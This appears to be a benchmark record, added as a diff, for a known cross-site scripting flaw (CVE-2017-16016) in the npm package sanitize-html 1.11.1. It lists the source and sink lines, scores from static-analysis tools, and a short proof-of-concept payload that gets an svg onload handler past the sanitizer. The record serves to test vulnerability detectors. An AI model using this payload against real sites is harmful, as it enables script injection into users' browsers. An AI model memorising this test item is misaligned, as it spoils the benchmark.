@@ -1,0 +1,76 @@
+{
+    "advisory": {
+        "id": "GHSA-xc6g-ggrc-qq4r",
+        "npm_id": "154",
+        "cve": "CVE-2017-16016",
+        "cwe": "CWE-725",
+        "github_link": "https://github.com/advisories/GHSA-xc6g-ggrc-qq4r"
+    },
+    "correct_cwe": "CWE-725",
+    "correct_package_link": "https://registry.npmjs.org/sanitize-html/-/sanitize-html-1.11.1.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "index.js",
+                    "lineno": 190,
+                    "code": " ontext: function(text) {"
+                },
+                "sink": {
+                    "file": "index.js",
+                    "lineno": 204,
+                    "code": "result += text;"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "url": "https://github.com/apostrophecms/sanitize-html/issues/100",
+            "file_path": "154_GHSA-xc6g-ggrc-qq4r.poc.js"
+        },
+        {
+            "code": "var sanitizeHtml = require('sanitize-html');\nvar dirty = '!<textarea>&lt;/textarea&gt;&lt;svg/onload=prompt`xs`&gt;</textarea>!';\nvar clean = sanitizeHtml(dirty, {\nallowedTags: [ 'textarea' ]\n});\nconsole.log(clean);\n// !<textarea></textarea><svg/onload=prompt`xs`></textarea>!"
+        },
+        {
+            "file_path": "154_GHSA-xc6g-ggrc-qq4r.poc.js"
+        }
+    ],
+    "patch": [
+        {
+            "url": ""
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "D"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "D"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "C"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "C"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "D"
+        },
+        "odgen": {
+            "score": "C"
+        }
+    }
+}
